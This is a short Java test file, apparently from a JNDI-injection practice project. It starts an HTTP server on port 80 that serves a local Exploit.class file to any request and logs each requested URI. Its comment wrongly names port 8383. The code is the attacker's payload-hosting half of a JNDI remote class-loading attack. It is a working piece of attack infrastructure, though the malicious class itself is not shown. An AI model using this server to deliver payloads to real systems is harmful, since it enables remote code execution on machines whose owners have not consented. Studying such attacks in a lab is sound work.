package test;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URI;

public class httpServerTest {
    public static void main(String[] args) throws IOException {
        // 创建 http 服务器, 绑定本地 8383 端口
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(80), 0);

        httpServer.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange httpExchange) throws IOException {
                System.out.println("---url: " + httpExchange.getRequestURI().getQuery());
                URI url=httpExchange.getRequestURI();
                System.out.println(url);
                File file = new File("/Users/lvzhibo/IdeaProjects/JNDIInject/data/Exploit.class");
                OutputStream out = httpExchange.getResponseBody();
                try (FileInputStream in = new FileInputStream(file)){

                    httpExchange.getResponseHeaders().add("Content-Disposition", "attachment;filename="+file.getName());
                    httpExchange.sendResponseHeaders(200, file.length());
                    byte[] fileBytes = new byte[(int) file.length()];
                    in.read(fileBytes);
                    out.write(fileBytes);
                } finally {
                    out.flush();
                    out.close();
                }
            }
        });
        httpServer.start();
//            httpServer.stop(0);
    }

}
